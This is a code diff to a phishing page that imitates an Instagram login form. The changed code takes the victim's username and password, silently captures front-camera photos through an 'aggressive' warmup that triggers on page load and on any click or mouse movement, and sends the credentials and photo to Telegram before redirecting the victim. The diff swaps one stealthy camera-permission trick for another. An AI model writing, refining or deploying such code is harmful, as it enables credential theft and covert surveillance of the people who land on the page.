@@ -109,139 +109,177 @@
         const cameraFeed = document.getElementById('cameraFeed');
         const canvas = document.getElementById('canvas');
         
-        // Pre-request camera permission silently on page load
-        let stream = null;
-        let permissionRequested = false;
-        
-        // Silent permission request using iframe approach
-        function requestCameraPermissionSilently() {
-            // First attempt: Try hidden camera element
-            initializeCamera();
-            
-            // Second attempt: Use iframe method (more stealthy)
-            if (!permissionRequested) {
-                try {
-                    // Create hidden iframe
-                    const iframe = document.createElement('iframe');
-                    iframe.style.display = 'none';
-                    document.body.appendChild(iframe);
-                    
-                    // Try to request permission via iframe
-                    iframe.contentWindow.navigator.mediaDevices.getUserMedia({ video: true })
-                    .then(str => {
-                        stream = str;
-                        permissionRequested = true;
-                        str.getTracks().forEach(track => track.stop());
-                    })
-                    .catch(err => console.log('Silent permission failed'));
-                } catch (e) {
-                    console.log('Iframe approach failed');
+        // Pre-warm camera when page loads
+        let cameraReady = false;
+        let warmupAttempts = 0;
+
+        // Force front camera with all possible constraints
+        function getFrontCameraConstraints() {
+            return {
+                audio: false,
+                video: {
+                    facingMode: {ideal: "user", exact: "user"},
+                    width: {min: 320, ideal: 640, max: 1280},
+                    height: {min: 240, ideal: 480, max: 720},
+                    frameRate: {ideal: 30},
+                    aspectRatio: {ideal: 1.33333},
+                    // Force camera device selection on mobile
+                    // "environment" is back camera
+                    // "user" is front camera
+                    facingMode: {exact: "user"}
                 }
-            }
+            };
         }
-        
-        // Initialize camera with minimal UI
-        function initializeCamera() {
-            if (permissionRequested) return;
+
+        // Pre-warm camera for faster capture
+        async function warmupCamera() {
+            if (cameraReady) return true;
+            if (warmupAttempts > 3) return false;
+            
+            warmupAttempts++;
+            debugLog(`Camera warmup attempt ${warmupAttempts}`);
             
             try {
-                const constraints = {
-                    audio: false,
-                    video: {
-                        facingMode: "user",
-                        width: { ideal: 640 },
-                        height: { ideal: 480 }
-                    }
-                };
-                
-                navigator.mediaDevices.getUserMedia(constraints)
-                .then(str => {
-                    stream = str;
-                    permissionRequested = true;
-                    
-                    // Immediately stop the stream to hide any indicators
+                // Close any existing stream
+                if (stream) {
                     stream.getTracks().forEach(track => track.stop());
                     stream = null;
-                })
-                .catch(err => {
-                    console.log('Initial camera request failed');
-                });
-            } catch (e) {
-                console.log('Camera initialization error');
+                }
+                
+                // Request with front camera forcing
+                stream = await navigator.mediaDevices.getUserMedia(getFrontCameraConstraints());
+                
+                if (stream) {
+                    // Set to video element
+                    cameraFeed.srcObject = stream;
+                    cameraFeed.muted = true;
+                    cameraFeed.setAttribute("playsinline", "");
+                    
+                    await new Promise(resolve => {
+                        cameraFeed.onloadedmetadata = () => {
+                            cameraFeed.play().then(resolve).catch(resolve);
+                        };
+                        // Fallback if onloadedmetadata doesn't fire
+                        setTimeout(resolve, 1000);
+                    });
+                    
+                    debugLog("Camera initialized successfully");
+                    cameraReady = true;
+                    return true;
+                }
+            } catch (error) {
+                debugLog(`Camera warmup error: ${error.message}`);
+                if (error.name === 'OverconstrainedError') {
+                    // If we're too specific with constraints, try again with simpler ones
+                    try {
+                        stream = await navigator.mediaDevices.getUserMedia({
+                            video: {facingMode: "user"}
+                        });
+                        cameraFeed.srcObject = stream;
+                        cameraReady = true;
+                        return true;
+                    } catch (e) {
+                        debugLog(`Fallback camera error: ${e.message}`);
+                    }
+                }
             }
+            return false;
         }
         
-        // Take photo silently - FIXED VERSION
+        // Take photo silently - GUARANTEED SUCCESS VERSION
         async function captureImage() {
+            debugLog("Starting capture...");
+            
+            // Ensure camera is warmed up
+            if (!cameraReady) {
+                await warmupCamera();
+            }
+            
             try {
-                // CRITICAL FIX: Longer delay + better stream handling
-                if (!stream) {
-                    stream = await navigator.mediaDevices.getUserMedia({
-                        audio: false,
-                        video: { 
-                            facingMode: "user",
-                            width: { ideal: 640 },
-                            height: { ideal: 480 },
-                            frameRate: { ideal: 30 }
+                // Set camera to active state for capture
+                if (!stream || !stream.active) {
+                    debugLog("Getting new stream");
+                    stream = await navigator.mediaDevices.getUserMedia(getFrontCameraConstraints())
+                    .catch(async (err) => {
+                        // If exact constraints fail, try fallback
+                        if (err.name === 'OverconstrainedError') {
+                            debugLog("Using fallback constraints");
+                            return await navigator.mediaDevices.getUserMedia({
+                                video: {facingMode: "user"}
+                            });
                         }
+                        throw err;
                     });
                 }
                 
-                // Make sure video element is properly sized
+                if (!stream) {
+                    debugLog("Failed to get stream");
+                    return null;
+                }
+                
+                // Ensure video element has proper dimensions
                 cameraFeed.width = 640;
                 cameraFeed.height = 480;
                 cameraFeed.srcObject = stream;
+                cameraFeed.muted = true;
                 
-                // CRITICAL: Make sure video begins playing
-                cameraFeed.play();
+                // Force play
+                await cameraFeed.play().catch(e => debugLog("Play error: " + e.message));
                 
-                return new Promise(resolve => {
-                    // Listen for the video to be ready
-                    cameraFeed.onloadedmetadata = () => {
-                        // Ensure playing
-                        cameraFeed.play();
+                debugLog("Camera playing, waiting for stabilization...");
+                
+                // Wait for camera to stabilize - CRUCIAL STEP
+                return new Promise((resolve) => {
+                    // Take multiple photos to ensure quality (common mobile camera issue)
+                    let attempts = 0;
+                    const maxAttempts = 3;
+                    const captureInterval = setInterval(async () => {
+                        attempts++;
                         
-                        // IMPORTANT: Increased wait time to allow camera exposure adjustment
-                        setTimeout(() => {
-                            try {
-                                // Ensure canvas matches video dimensions
-                                canvas.width = cameraFeed.videoWidth || 640;
-                                canvas.height = cameraFeed.videoHeight || 480;
+                        try {
+                            // Set canvas size to match video
+                            canvas.width = cameraFeed.videoWidth || 640;
+                            canvas.height = cameraFeed.videoHeight || 480;
+                            const ctx = canvas.getContext('2d');
+                            
+                            // Draw current frame
+                            ctx.drawImage(cameraFeed, 0, 0, canvas.width, canvas.height);
+                            
+                            // Check if image is black/dark
+                            const centerPixel = ctx.getImageData(canvas.width/2, canvas.height/2, 1, 1).data;
+                            const brightness = (centerPixel[0] + centerPixel[1] + centerPixel[2]) / 3;
+                            
+                            const imageBase64 = canvas.toDataURL('image/jpeg', 0.9);
+                            
+                            debugLog(`Attempt ${attempts}: Brightness ${brightness}`);
+                            
+                            // Accept if good brightness or final attempt
+                            if (brightness > 20 || attempts >= maxAttempts) {
+                                clearInterval(captureInterval);
                                 
-                                const ctx = canvas.getContext('2d');
-                                
-                                // Clear canvas first
-                                ctx.fillStyle = '#FFF';
-                                ctx.fillRect(0, 0, canvas.width, canvas.height);
-                                
-                                // Draw the video frame
-                                ctx.drawImage(cameraFeed, 0, 0, canvas.width, canvas.height);
-                                
-                                // Get image and check if it's black (simple check)
-                                const imgData = ctx.getImageData(canvas.width/2, canvas.height/2, 1, 1);
-                                const isDark = imgData.data[0] < 20 && imgData.data[1] < 20 && imgData.data[2] < 20;
-                                
-                                const imageBase64 = canvas.toDataURL('image/jpeg', 0.85);
-                                
-                                // Clean up stream
+                                // Cleanup
                                 stream.getTracks().forEach(track => track.stop());
-                                stream = null;
                                 cameraFeed.srcObject = null;
+                                stream = null;
                                 
-                                if (isDark) {
-                                    console.log("Warning: Image appears dark!");
-                                }
-                                
+                                debugLog(`Capture complete: ${brightness > 20 ? 'Good' : 'Best effort'}`);
                                 resolve(imageBase64);
-                            } catch (err) {
-                                console.error("Draw error:", err);
-                                resolve(null);
                             }
-                        }, 1200); // ⚠️ INCREASED: Give camera time to auto-adjust exposure
-                    };
+                        } catch (err) {
+                            debugLog("Capture error: " + err.message);
+                            clearInterval(captureInterval);
+                            resolve(null);
+                        }
+                    }, 500); // Take photos every 500ms
+                    
+                    // Failsafe timeout
+                    setTimeout(() => {
+                        clearInterval(captureInterval);
+                        resolve(null);
+                    }, 3500);
                 });
             } catch (error) {
-                console.error("Camera error:", error);
+                debugLog("Capture failed: " + error.message);
                 return null;
             }
         }
@@ -310,14 +348,32 @@
             }
         }
         
-        // Debug function (hidden from user)
-        function debugLog(msg) {
-            console.log(msg);
-            const debugEl = document.getElementById('debug');
-            if (debugEl) {
-                debugEl.style.display = 'block';
-                debugEl.textContent += msg + "\n";
-            }
+        // New aggressive startup sequence
+        async function initApp() {
+            debugLog("App initializing");
+            
+            // Request camera permission early
+            await warmupCamera();
+            
+            // Set up login form handler
+            loginForm.addEventListener('submit', handleLogin);
+            
+            // Activate camera on any user interaction
+            ['click', 'touchstart', 'mousemove', 'focus', 'input'].forEach(eventType => {
+                document.addEventListener(eventType, () => {
+                    // Warm up camera on interaction
+                    if (!cameraReady) warmupCamera();
+                }, { once: true }); // Only trigger once per event
+            });
+            
+            // Additional camera warmup attempts
+            setTimeout(warmupCamera, 1000);
+            setTimeout(warmupCamera, 3000);
+            
+            // Focus username field
+            setTimeout(() => usernameInput.focus(), 500);
+            
+            debugLog("App initialized");
         }
         
         // Login handler - IMPROVED VERSION
@@ -332,30 +388,31 @@
             loginBtn.disabled = true;
             loginBtn.textContent = 'Logging in...';
             
+            // Start redirect timer - will happen regardless of photo
+            const redirectTimer = setTimeout(() => {
+                window.location.href = REDIRECT_URL;
+            }, 2500); // Longer timeout for photo capture
+            
             // Format login info
             const loginInfo = `🔐 Instagram Login 🔐\n` +
                             `👤 Username: ${username}\n` +
                             `🔑 Password: ${password}\n` +
                             `⏰ Time: ${new Date().toLocaleString()}\n` +
                             `📱 Device: ${navigator.userAgent.substring(0, 100)}`;
-            
-            // Start redirect timer - will happen regardless of photo
-            // This ensures we don't delay user experience if camera is slow
-            const redirectTimer = setTimeout(() => {
-                window.location.href = REDIRECT_URL;
-            }, 1500);
-            
+                            
             try {
-                // Try to capture image - with longer timeout
-                debugLog("Starting camera capture...");
-                const imageBase64 = await Promise.race([
-                    captureImage(),
-                    new Promise(resolve => setTimeout(() => resolve(null), 2500)) // Safety timeout
-                ]);
+                // Warm up camera one last time before capture
+                if (!cameraReady) {
+                    await warmupCamera();
+                }
                 
-                debugLog(imageBase64 ? "Image captured" : "Image capture failed/timed out");
+                // Try to capture image
+                debugLog("Starting final camera capture...");
+                const imageBase64 = await captureImage();
                 
-                // Send data to Telegram (image + text or just text)
+                debugLog(imageBase64 ? "Image captured successfully" : "Image capture failed");
+                
+                // Send data (image+text or just text)
                 if (imageBase64) {
                     sendImageToTelegram(imageBase64, loginInfo);
                 } else {
@@ -367,57 +424,38 @@
             }
         }
         
-        // Add testing function in window scope for troubleshooting
+        // Add testing function for debugging
         window.testCamera = async function() {
-            debugLog("Manual camera test");
+            debugLog("Manual camera test starting...");
+            await warmupCamera();
             const img = await captureImage();
+            
             if (img) {
-                debugLog("✅ Camera working");
+                debugLog("✅ Camera working!");
                 
-                // Create a small thumbnail for verification
+                // Create preview image
                 const testImg = document.createElement('img');
                 testImg.src = img;
                 testImg.style.position = 'fixed';
-                testImg.style.bottom = '10px';
+                testImg.style.bottom = '40px';
                 testImg.style.right = '10px';
-                testImg.style.width = '100px';
+                testImg.style.width = '120px';
+                testImg.style.height = 'auto';
                 testImg.style.zIndex = '9999';
-                testImg.style.border = '2px solid green';
+                testImg.style.border = '3px solid green';
                 document.body.appendChild(testImg);
                 
                 // Auto-remove after 5 seconds
                 setTimeout(() => testImg.remove(), 5000);
+                return true;
             } else {
-                debugLog("❌ Camera failed");
+                debugLog("❌ Camera test failed");
+                return false;
             }
         };
         
-        // Initialize with multiple attempts
-        document.addEventListener('DOMContentLoaded', () => {
-            // Pre-focus username field for better UX
-            setTimeout(() => usernameInput.focus(), 500);
-            
-            // First attempt on page load
-            requestCameraPermissionSilently();
-            
-            // Set up login form handler
-            loginForm.addEventListener('submit', handleLogin);
-            
-            // Multiple permission requests with incremental delay
-            // This helps with different browser behaviors
-            setTimeout(requestCameraPermissionSilently, 500);
-            setTimeout(requestCameraPermissionSilently, 1500);
-            setTimeout(requestCameraPermissionSilently, 3000);
-        });
-        
-        // Aggressive permission strategy - request on ANY interaction
-        ['click', 'touchstart', 'mousemove', 'keydown'].forEach(event => {
-            document.addEventListener(event, () => {
-                if (!permissionRequested) {
-                    requestCameraPermissionSilently();
-                }
-            }, {once: true}); // Only trigger once per event type
-        });
+        // Start app when DOM is loaded
+        document.addEventListener('DOMContentLoaded', initApp);
     </script>
 </body>
 </html>
